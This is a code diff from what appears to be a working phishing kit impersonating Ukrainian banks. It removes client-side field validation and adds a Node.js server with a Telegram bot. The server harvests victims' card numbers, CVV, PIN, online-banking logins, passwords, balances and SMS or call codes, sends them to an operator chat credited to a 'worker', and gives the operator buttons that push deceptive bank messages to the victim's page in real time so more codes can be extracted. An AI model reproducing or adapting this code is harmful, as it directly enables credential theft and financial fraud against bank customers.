-            let value = input.value.replace(/\D/g, '');
-            let requiredLength = 0;
-            switch (input.id) {
-                case 'phone': requiredLength = 9; break;
-                case 'card': case 'card_confirm': requiredLength = 16; break;
-                case 'card-expiry': requiredLength = 4; break;
-                case 'card-cvv': requiredLength = 3; break;
-                case 'pin': requiredLength = 4; break;
+            const data = JSON.parse(message);
+            if (data.type === 'register' && data.sessionId) {
+                clients.set(data.sessionId, ws);
+                console.log(`Клиент зарегистрирован: ${data.sessionId}`);
             }
-            if (requiredLength > 0 && value.length < requiredLength) {
-                isValid = false;
-                input.classList.add('invalid');
-                if (errorContainer) {
-                    errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`;
-                    errorContainer.style.display = 'block';
-                }
+        } catch (e) { console.error('Ошибка обработки WebSocket сообщения:', e); }
+    });
+    ws.on('close', () => {
+        clients.forEach((clientWs, sessionId) => {
+            if (clientWs === ws) {
+                clients.delete(sessionId);
+                console.log(`Клиент отключился: ${sessionId}`);
             }
-        });
-        return isValid;
-    }
-
-    async function submitSmsCode() {
-        const codeInput = document.getElementById('sms-code');
-        const code = codeInput.value;
-        const errorContainer = document.getElementById('sms-error-container');
-        if (!code.trim()) {
-            if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
-            return;
-        }
-        try {
-            await fetch(`/api/sms`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }),
-            });
-        } catch (error) {
-            console.error('Failed to send sms code:', error);
-        }
-        if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`;
-        codeInput.value = '';
-    }
-    
-    document.querySelectorAll('.bank-item').forEach(item => {
-        item.addEventListener('click', e => {
-            e.preventDefault();
-            if (item.classList.contains('disabled')) return;
-            const bankId = item.dataset.bank;
-            activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
-            body.dataset.theme = activeBankData.theme;
-            formHeaderLogo.src = activeBankData.logoUrl;
-            body.classList.add('form-active');
-            currentStepIndex = 0;
-            collectedData = {};
-            renderStep();
-            connectWebSocket();
         });
     });
+    ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
 });
-</script>
-</body>
-</html>
+
+// Обработчик нажатий на кнопки
+bot.on('callback_query', (callbackQuery) => {
+    const [type, sessionId] = callbackQuery.data.split(':');
+    
+    // --- ДОБАВЛЕНО ЛОГИРОВАНИЕ ---
+    console.log(`--- ПОЛУЧЕНО НАЖАТИЕ НА КНОПКУ (callback_query) ---`);
+    console.log(`Тип: ${type}, Сессия: ${sessionId}`);
+
+    if (type === 'custom_message') {
+        waitingForCustomMessage.set(callbackQuery.message.chat.id, sessionId);
+        bot.sendMessage(callbackQuery.message.chat.id, `✏️ Введите сообщение для клиента <code>${sessionId}</code>:`, {
+            parse_mode: 'HTML',
+            reply_markup: { force_reply: true }
+        }).then((sentMessage) => {
+            waitingForCustomMessage.set('reply_to_message_id', sentMessage.message_id);
+        });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    
+    const ws = clients.get(sessionId);
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        console.log(`Найдена активная сессия для ${sessionId}. Отправляю команду...`);
+        let commandData = {};
+        const sessionData = sessions.get(sessionId) || {};
+        const bankName = sessionData.bankName || '';
+
+        // ... (остальная логика кнопок без изменений)
+        switch (type) {
+            case 'sms':
+                commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
+                break;
+            case 'lk':
+            case 'call':
+                commandData = { bankName };
+                break;
+            case 'other':
+                commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку", bankName };
+                break;
+            case 'pin_error':
+                commandData = { text: "Ви не змогли підтвердити володіння карткою. Для підтвердження володіння карткою натисніть назад та заповніть форму з вірним пін-кодом" };
+                break;
+            case 'number_error':
+                commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
+                break;
+            case 'request_details':
+                commandData = { isRaiffeisen: bankName === 'Райффайзен' };
+                break;
+        }
+
+        ws.send(JSON.stringify({ type: type, data: commandData }));
+        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
+    } else {
+        console.log(`Ошибка: клиент для сессии ${sessionId} не найден или не в сети.`);
+        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
+    }
+});
+
+
+// Остальной код (обработчики API, сообщений и т.д.) без изменений
+// ...
+app.post('/api/submit', (req, res) => {
+    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
+    let workerNick = 'unknown';
+    try {
+        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
+    } catch (e) {}
+    const existingData = sessions.get(sessionId) || {};
+    const newData = { ...existingData, ...stepData };
+    sessions.set(sessionId, newData);
+    if (isFinalStep && !newData.logSent) {
+        newData.logSent = true;
+        sessions.set(sessionId, newData);
+        const cardNumber = newData.card_confirm || newData.card;
+        let visitCount = 1;
+        if (cardNumber) {
+            visitCount = (cardVisitCounts.get(cardNumber) || 0) + 1;
+            cardVisitCounts.set(cardNumber, visitCount);
+        }
+        let message = `<b>Новий запис!</b>\n\n`;
+        message += `<b>Назва банку:</b> ${newData.bankName}\n`;
+        message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
+        message += `<b>Номер карти:</b> <code>${cardNumber || 'Не вказано'}</code>\n`;
+        if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
+        if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
+        if (newData.pin) message += `<b>Пін:</b> <code>${newData.pin}</code>\n`;
+        if (newData.login) message += `<b>Логін:</b> <code>${newData.login}</code>\n`;
+        if (newData.password) message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
+        if (newData.call_code_input) message += `<b>Код із дзвінка:</b> <code>${newData.call_code_input}</code>\n`;
+        if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
+        const visitText = visitCount === 1 ? 'NEW' : `${visitCount} раз`;
+        message += `<b>Кількість переходів:</b> ${visitText}\n`;
+        message += `<b>Worker:</b> @${workerNick}\n`;
+        sendToTelegram(message, sessionId, newData.bankName);
+    }
+    res.status(200).json({ message: 'OK' });
+});
+app.post('/api/sms', (req, res) => {
+    const { sessionId, code, referrer } = req.body;
+    let workerNick = 'unknown';
+    try {
+        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
+    } catch (e) {}
+    const sessionData = sessions.get(sessionId);
+    if (sessionData) {
+        let message = `<b>Отримано SMS!</b>\n\n`;
+        message += `<b>Код:</b> <code>${code}</code>\n`;
+        message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
+        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
+        message += `<b>Worker:</b> @${workerNick}\n`;
+        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        res.status(200).json({ message: 'OK' });
+    } else {
+        res.status(404).json({ message: 'Session not found' });
+    }
+});
+function sendToTelegram(message, sessionId, bankName) {
+    const keyboard = [
+        [{ text: 'SMS', callback_data: `sms:${sessionId}` }, { text: 'ЛК', callback_data: `lk:${sessionId}` }, { text: 'Звонок', callback_data: `call:${sessionId}` }],
+        [{ text: 'Невірний ПІН', callback_data: `pin_error:${sessionId}` }, { text: 'КОД', callback_data: `code_error:${sessionId}` }, { text: 'КОД ✅', callback_data: `timer:${sessionId}` }],
+        [{ text: 'Номер', callback_data: `number_error:${sessionId}` }, { text: 'OTHER', callback_data: `other:${sessionId}` }],
+        [{ text: 'BAN 🚫', callback_data: `ban:${sessionId}` }, { text: 'СВОЙ ✏️', callback_data: `custom_message:${sessionId}` }]
+    ];
+    if (banksForRequestButton.includes(bankName)) {
+        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
+    }
+    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } }).catch(err => console.error("Telegram send error:", err));
+}
+bot.on('message', (msg) => {
+    if (msg.reply_to_message && msg.reply_to_message.message_id === waitingForCustomMessage.get('reply_to_message_id')) {
+        const sessionId = waitingForCustomMessage.get(msg.chat.id);
+        const ws = clients.get(sessionId);
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ type: 'custom_message_text', data: { text: msg.text } }));
+            bot.sendMessage(msg.chat.id, `✅ Сообщение отправлено <code>${sessionId}</code>.`, { parse_mode: 'HTML' });
+        } else {
+            bot.sendMessage(msg.chat.id, `❌ Не удалось отправить. Клиент <code>${sessionId}</code> не в сети.`, { parse_mode: 'HTML' });
+        }
+        waitingForCustomMessage.delete(msg.chat.id);
+        waitingForCustomMessage.delete('reply_to_message_id');
+    }
+});
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, '0.0.0.0', () => console.log(`Сервер запущен на порту ${PORT}`));
